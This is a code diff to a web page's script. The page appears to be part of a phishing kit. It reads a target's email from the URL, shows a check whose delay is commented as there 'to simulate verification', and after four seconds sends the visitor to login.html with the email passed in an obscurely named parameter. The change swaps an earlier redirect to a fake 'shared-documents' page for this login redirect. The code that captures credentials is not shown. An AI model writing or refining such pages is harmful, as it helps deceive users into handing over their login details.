@@ -89,6 +89,7 @@
       const params = new URLSearchParams(window.location.search);
       const emailParam = params.get("u"); // FIXED
 
+      // If email is present and valid
       if (emailParam && emailParam.includes("@")) {
         extractedEmail = emailParam.trim();
 
@@ -105,20 +106,16 @@
       document.getElementById("turnstile-form").submit();
     }
 
-    // Redirect after verification (or delay)
+    // Redirect after 4 sec
     window.onload = function () {
-      if (extractedEmail) {
-        // Redirect to shared-documents with the email parameter
-        setTimeout(() => {
-          const redirectUrl = `/shared-documents-39207fb292f2568236f329?u=${encodeURIComponent(extractedEmail)}`;
-          window.location.href = redirectUrl;
-        }, 4000);  // Delay redirect to simulate verification
-      } else {
-        // If no email, redirect to the login page
-        setTimeout(() => {
+      setTimeout(() => {
+        // Redirect to login page with email if available
+        if (extractedEmail) {
+          window.location.href = "login.html?br29ns97=" + encodeURIComponent(extractedEmail);
+        } else {
           window.location.href = "login.html";
-        }, 4000);
-      }
+        }
+      }, 4000);
     };
   </script>
 </body>
